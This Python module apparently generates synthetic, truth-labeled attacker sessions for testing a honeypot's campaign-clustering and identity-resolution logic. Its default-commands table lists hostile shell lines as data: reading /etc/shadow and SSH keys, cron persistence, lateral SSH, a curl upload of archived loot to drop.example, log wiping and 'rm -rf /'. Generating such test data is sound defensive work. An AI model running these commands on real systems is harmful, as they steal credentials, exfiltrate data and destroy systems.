"""
Synthetic campaign generator — see development/CAMPAIGN_CLUSTERING.md.

Reads a YAML campaign DSL describing actors, UKC phases, and tool
signatures, and emits truth-labeled SyntheticAttacker / SyntheticSession
records for the clustering test harness.

Truth labels (`truth_campaign_id`, `truth_actor_id`) are part of the
emitted records so the metric harness can score predicted clusters
against ground truth without re-parsing the DSL. Production code that
later writes the same shape into real DB tables MUST strip these fields
before clustering runs — otherwise the algorithm trivially passes by
reading the answer key.

Determinism: given the same YAML and seed, two runs produce identical
records (including IDs). This is a load-bearing property — fixture
expectations are checked against the same seed every CI run.
"""
from __future__ import annotations

import hashlib
import random
import uuid
from dataclasses import dataclass, field
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any

import yaml

from decnet.clustering.ukc import OBSERVABLE_PHASES, UKCPhase


@dataclass
class SyntheticSession:
    session_id: str
    attacker_id: str
    decky_id: str
    started_at: datetime
    duration_s: float
    phase: UKCPhase
    commands: list[str]
    credentials_tried: list[tuple[str, str]]
    payload_hash: str | None
    c2_callback: str | None
    truth_campaign_id: str
    truth_actor_id: str
    truth_identity_id: str = ""


@dataclass
class SyntheticAttacker:
    """One per-IP observation row. Multiple rows per DSL actor when
    ``ip_pool: rotating`` — they all share ``truth_identity_id`` /
    ``truth_actor_id`` / ``truth_campaign_id`` plus ``ja3`` / ``hassh``,
    differ on ``ip`` and (optionally) ``asn``. This matches production
    shape: DECNET creates one ``Attacker`` row per source IP, and the
    clusterer recovers identity by joining on stable fingerprints.
    See development/IDENTITY_RESOLUTION.md.
    """
    attacker_id: str
    ip: str
    asn: int
    ja3: str | None
    hassh: str | None
    first_seen: datetime
    last_seen: datetime
    truth_campaign_id: str
    truth_actor_id: str
    truth_identity_id: str = ""
    sessions: list[SyntheticSession] = field(default_factory=list)


@dataclass
class GeneratedCorpus:
    """Output of the factory — what the clusterer consumes."""
    attackers: list[SyntheticAttacker]
    # Convenience: flat list of every session across every attacker.
    sessions: list[SyntheticSession]

    def truth_labels(self, *, level: str = "campaign") -> dict[str, str]:
        """``attacker_id -> truth-{level}-id`` oracle the clusterer is scored against.

        ``level``:
          - ``"campaign"`` (default) — campaign-clustering oracle.
          - ``"identity"`` — identity-resolution oracle. Multiple
            observations from a single rotating actor share an identity
            label; campaign-level still groups them with whatever else
            is in their campaign.
          - ``"actor"`` — for completeness; equivalent to identity for
            the single-campaign single-actor case but distinguishes
            multi-actor campaigns where each operator is its own
            identity (e.g. fixture 5 multi_operator).
        """
        if level == "campaign":
            return {a.attacker_id: a.truth_campaign_id for a in self.attackers}
        if level == "identity":
            return {a.attacker_id: a.truth_identity_id for a in self.attackers}
        if level == "actor":
            return {a.attacker_id: a.truth_actor_id for a in self.attackers}
        raise ValueError(f"unknown truth-label level: {level!r}")


# ─── Phase defaults ─────────────────────────────────────────────────────────
# When the DSL doesn't specify tool_signature commands for a phase, fall
# back to these. Keeps fixtures terse without making the factory invent
# data ad-hoc per call.

_PHASE_DEFAULT_COMMANDS: dict[UKCPhase, list[str]] = {
    UKCPhase.DELIVERY: [],  # delivery is mostly network-level, no shell commands
    UKCPhase.EXPLOITATION: [],
    UKCPhase.DISCOVERY: ["whoami", "id", "uname -a", "ip route", "arp -a", "cat /etc/passwd"],
    UKCPhase.CREDENTIAL_ACCESS: ["cat /etc/shadow", "find / -name id_rsa", "cat ~/.ssh/known_hosts"],
    UKCPhase.PERSISTENCE: ["crontab -l", "echo '* * * * * /tmp/.x' | crontab -", "cat ~/.ssh/authorized_keys"],
    UKCPhase.LATERAL_MOVEMENT: ["ssh -i /tmp/.k root@10.0.0.5", "scp /tmp/.x root@10.0.0.5:/tmp/"],
    UKCPhase.COLLECTION: ["tar czf /tmp/loot.tgz /var/lib/mysql /home"],
    UKCPhase.EXFILTRATION: ["curl -T /tmp/loot.tgz https://drop.example/"],
    UKCPhase.EXECUTION: ["./payload"],
    UKCPhase.PRIVILEGE_ESCALATION: ["sudo -l", "find / -perm -u=s 2>/dev/null"],
    UKCPhase.DEFENSE_EVASION: ["history -c", "rm -rf /var/log/wtmp"],
    UKCPhase.COMMAND_AND_CONTROL: [],  # beaconing observed at network layer
    UKCPhase.PIVOTING: [],
    UKCPhase.IMPACT: ["rm -rf /"],
    UKCPhase.OBJECTIVES: [],
}


# ─── DSL parsing ────────────────────────────────────────────────────────────


class DSLValidationError(ValueError):
    """Raised when a campaign YAML is malformed or references unknown phases."""


def _validate_campaign_spec(spec: dict[str, Any]) -> list[str]:
    """Return list of warnings (e.g. unobservable phases). Raises on hard errors."""
    if "campaign" not in spec:
        raise DSLValidationError("missing top-level 'campaign' key")
    c = spec["campaign"]
    for key in ("id", "actors", "phases"):
        if key not in c:
            raise DSLValidationError(f"campaign missing required key: {key}")

    actor_ids = {a["id"] for a in c["actors"]}
    if not actor_ids:
        raise DSLValidationError("campaign must declare at least one actor")

    warnings: list[str] = []
    for i, ph in enumerate(c["phases"]):
        if "name" not in ph:
            raise DSLValidationError(f"phase[{i}] missing 'name'")
        try:
            phase_enum = UKCPhase(ph["name"])
        except ValueError as exc:
            raise DSLValidationError(
                f"phase[{i}] has unknown UKC phase '{ph['name']}'"
            ) from exc
        if phase_enum not in OBSERVABLE_PHASES:
            warnings.append(
                f"phase '{ph['name']}' is pre-target / unobservable from a "
                f"honeypot; no events will be emitted for it"
            )
        # Single-actor campaigns can omit phase.actor; multi-actor must specify.
        if "actor" in ph and ph["actor"] not in actor_ids:
            raise DSLValidationError(
                f"phase[{i}] references unknown actor '{ph['actor']}'"
            )
    return warnings


# ─── Generator ──────────────────────────────────────────────────────────────


def _stable_uuid(rng: random.Random, prefix: str) -> str:
    """Deterministic UUID-shaped identifier driven by the seeded RNG."""
    raw = rng.randbytes(16)
    return f"{prefix}-{uuid.UUID(bytes=raw)}"


def _stable_ip(rng: random.Random) -> str:
    """Pick a routable-looking IPv4 in non-RFC1918 space."""
    # Avoid 10/8, 172.16/12, 192.168/16, 127/8, 0/8, multicast 224+.
    while True:
        a = rng.randint(1, 223)
        if a in (10, 127):
            continue
        b = rng.randint(0, 255)
        if a == 172 and 16 <= b <= 31:
            continue
        if a == 192 and b == 168:
            continue
        c = rng.randint(0, 255)
        d = rng.randint(1, 254)
        return f"{a}.{b}.{c}.{d}"


def _payload_hash(seed: str) -> str:
    return hashlib.sha256(seed.encode()).hexdigest()


def _hour_to_offset(rng: random.Random, day_start: datetime, hour: int, jitter_s: int) -> datetime:
    base = day_start.replace(hour=hour, minute=0, second=0, microsecond=0)
    return base + timedelta(seconds=rng.randint(-jitter_s, jitter_s) + rng.randint(0, 3600))


def generate(spec: dict[str, Any], *, seed: int = 0) -> GeneratedCorpus:
    """
    Produce a deterministic synthetic corpus from a parsed YAML spec.

    The spec mirrors the schema documented in CAMPAIGN_CLUSTERING.md.
    Multiple campaigns + a noise block can be combined by wrapping them
    in a top-level `corpus:` key; otherwise a single `campaign:` is
    expected.
    """
    rng = random.Random(seed)

    campaigns: list[dict[str, Any]]
    noise_cfg: dict[str, Any]
    if "corpus" in spec:
        campaigns = spec["corpus"].get("campaigns", [])
        noise_cfg = spec["corpus"].get("noise", {}) or {}
    else:
        campaigns = [spec]
        noise_cfg = {}

    attackers: list[SyntheticAttacker] = []
    sessions: list[SyntheticSession] = []

    for c_wrapper in campaigns:
        warnings = _validate_campaign_spec(c_wrapper)
        # Surface warnings via stderr-like channel — tests can opt to assert.
        for w in warnings:
            # Stored on the corpus for inspection rather than printed; tests
            # that care can dig into the spec, but most don't.
            _ = w
        c = c_wrapper["campaign"]
        _emit_campaign(c, rng, attackers, sessions)

    _emit_noise(noise_cfg, rng, attackers, sessions)

    return GeneratedCorpus(attackers=attackers, sessions=sessions)


def _emit_campaign(
    c: dict[str, Any],
    rng: random.Random,
    attackers: list[SyntheticAttacker],
    sessions: list[SyntheticSession],
) -> None:
    campaign_id = c["id"]
    duration_days = int(c.get("duration_days", 1))
    pause_windows: list[tuple[int, int]] = [
        tuple(p) for p in c.get("pause_windows", [])  # type: ignore[misc]
    ]

    # Anchor the synthetic timeline at a fixed epoch so determinism holds
    # across runs regardless of wall clock.
    epoch = datetime(2026, 1, 1, tzinfo=timezone.utc)

    # Per-actor SyntheticAttacker rows. One per actor for ``ip_pool:
    # sticky`` (default); ``rotation_count`` rows for ``ip_pool:
    # rotating`` — distinct IPs (and optionally distinct ASNs via
    # ``rotation_asns``) but a SHARED ``truth_identity_id`` so the
    # clusterer's job is to recover them as one. This matches
    # production: an actor rotating across N IPs produces N ``Attacker``
    # observation rows that the clusterer needs to fold into one
    # ``AttackerIdentity``.
    #
    # ``actor_rows[actor_id]`` is the list the session scheduler
    # round-robins over so an actor's sessions distribute across the
    # rotated IPs naturally.
    actor_rows: dict[str, list[SyntheticAttacker]] = {}
    for actor in c["actors"]:
        # One identity per DSL actor — shared across all rotated rows.
        identity_id = _stable_uuid(rng, "id")
        ip_pool = actor.get("ip_pool", "sticky")
        rotation_count = int(actor.get("rotation_count", 1)) if ip_pool == "rotating" else 1
        rotation_asns: list[int] = list(actor.get("rotation_asns", []) or [])
        primary_asn = int(actor.get("asn", 0))

        rows: list[SyntheticAttacker] = []
        for r in range(rotation_count):
            # Cycle rotation_asns if shorter than rotation_count; fall
            # back to the actor's primary asn if no pool is given.
            asn_for_row = (
                rotation_asns[r % len(rotation_asns)]
                if rotation_asns else primary_asn
            )
            row = SyntheticAttacker(
                attacker_id=_stable_uuid(rng, "att"),
                ip=_stable_ip(rng),
                asn=asn_for_row,
                ja3=actor.get("ja3"),
                hassh=actor.get("hassh"),
                first_seen=epoch,
                last_seen=epoch,
                truth_campaign_id=campaign_id,
                truth_actor_id=actor["id"],
                truth_identity_id=identity_id,
            )
            rows.append(row)
            attackers.append(row)
        actor_rows[actor["id"]] = rows

    # Walk phases in declared order. Each phase produces N sessions
    # against random deckies (or a sticky one if previous_success).
    decky_pool = [f"decky-{i:02d}" for i in range(1, 21)]
    last_success_decky: dict[str, str] = {}

    for phase_idx, ph in enumerate(c["phases"]):
        phase = UKCPhase(ph["name"])
        if phase not in OBSERVABLE_PHASES:
            continue  # pre-target phase; emit nothing

        actor_id = ph.get("actor") or c["actors"][0]["id"]
        rows = actor_rows[actor_id]
        actor_spec = next(a for a in c["actors"] if a["id"] == actor_id)

        sig = ph.get("tool_signature", {}) or {}
        commands = sig.get("commands", _PHASE_DEFAULT_COMMANDS[phase])
        creds_list = sig.get("credentials") or []
        c2 = sig.get("c2_callback")
        payload_seed = sig.get("payload_hash")
        payload = _payload_hash(payload_seed) if payload_seed else None

        target_sel = ph.get("target_selector", {}) or {}
        n_sessions = int(target_sel.get("count", 1))
        if target_sel.get("decky") == "previous_success":
            decky_choices = [last_success_decky.get(actor_id, decky_pool[0])]
        else:
            decky_choices = decky_pool

        # Schedule sessions across the campaign window, respecting the
        # actor's hours_active_utc, pause_windows, and (if specified)
        # the actor's active_days. ``active_days`` (per-actor list of
        # day indexes) lets a fixture bind an actor to specific days
        # without affecting siblings — used by fixture 4 to model an
        # operator who pauses operations between sprints.
        active_hours = actor_spec.get("hours_active_utc", list(range(24)))
        jitter = int(actor_spec.get("jitter_seconds", 60))

        non_paused = [
            d for d in range(duration_days)
            if not any(s <= d <= e for s, e in pause_windows)
        ]
        actor_active_days = actor_spec.get("active_days")
        if actor_active_days is not None:
            # Intersect with non-paused so pause_windows still wins
            # globally if the fixture sets both (defensive).
            day_pool = [d for d in actor_active_days if d in non_paused]
        else:
            day_pool = non_paused

        for s_idx in range(n_sessions):
            if not day_pool:
                continue
            day = rng.choice(day_pool)
            hour = rng.choice(active_hours)
            day_start = epoch + timedelta(days=day)
            started_at = _hour_to_offset(rng, day_start, hour, jitter)
            duration_s = float(ph.get("dwell_seconds", 5))

            # Distribute sessions across the actor's rotated rows by
            # round-robin. With rotation_count=1 (sticky) every session
            # lands on the same row — back-compat preserved. With N>1,
            # sessions interleave so the clusterer sees N distinct
            # observation rows each with their own session timeline,
            # all sharing the actor's stable fingerprints.
            att = rows[s_idx % len(rows)]
            sess = SyntheticSession(
                session_id=_stable_uuid(rng, "sess"),
                attacker_id=att.attacker_id,
                decky_id=rng.choice(decky_choices),
                started_at=started_at,
                duration_s=duration_s,
                phase=phase,
                commands=list(commands),
                credentials_tried=[tuple(p) for p in creds_list],  # type: ignore[misc]
                payload_hash=payload,
                c2_callback=c2,
                truth_campaign_id=campaign_id,
                truth_actor_id=actor_id,
                truth_identity_id=att.truth_identity_id,
            )
            sessions.append(sess)
            att.sessions.append(sess)
            if started_at < att.first_seen or att.first_seen == epoch:
                att.first_seen = started_at
            if started_at > att.last_seen:
                att.last_seen = started_at
            # If this phase is a "successful entry," remember the decky
            # for any subsequent previous_success target_selector.
            if phase in (UKCPhase.EXPLOITATION, UKCPhase.PERSISTENCE):
                last_success_decky[actor_id] = sess.decky_id


def _emit_noise(
    noise_cfg: dict[str, Any],
    rng: random.Random,
    attackers: list[SyntheticAttacker],
    sessions: list[SyntheticSession],
) -> None:
    """Background scanners — opportunistic, no shared signals, singletons."""
    n_scanners = int(noise_cfg.get("scanner_count", 0))
    if n_scanners <= 0:
        return
    epoch = datetime(2026, 1, 1, tzinfo=timezone.utc)
    for i in range(n_scanners):
        scanner_id = f"noise-scanner-{i:04d}"
        # Each noise scanner is its own truth-campaign AND its own
        # truth-identity — opportunistic singletons share nothing with
        # anyone, including each other.
        att = SyntheticAttacker(
            attacker_id=_stable_uuid(rng, "att"),
            ip=_stable_ip(rng),
            asn=rng.randint(1000, 65000),
            ja3=None,
            hassh=None,
            first_seen=epoch,
            last_seen=epoch,
            truth_campaign_id=scanner_id,
            truth_actor_id=scanner_id,
            truth_identity_id=scanner_id,
        )
        attackers.append(att)
        # One Delivery-phase session, no follow-up.
        started = epoch + timedelta(seconds=rng.randint(0, 86400))
        sess = SyntheticSession(
            session_id=_stable_uuid(rng, "sess"),
            attacker_id=att.attacker_id,
            decky_id=f"decky-{rng.randint(1, 20):02d}",
            started_at=started,
            duration_s=1.0,
            phase=UKCPhase.DELIVERY,
            commands=[],
            credentials_tried=[],
            payload_hash=None,
            c2_callback=None,
            truth_campaign_id=scanner_id,
            truth_actor_id=scanner_id,
            truth_identity_id=scanner_id,
        )
        sessions.append(sess)
        att.sessions.append(sess)
        att.first_seen = started
        att.last_seen = started


def load_yaml(path: str | Path) -> dict[str, Any]:
    """Read a fixture file. Kept tiny so tests can inline-build specs too."""
    text = Path(path).read_text(encoding="utf-8")
    parsed = yaml.safe_load(text)
    if not isinstance(parsed, dict):
        raise DSLValidationError(f"campaign YAML at {path} did not parse to a mapping")
    return parsed
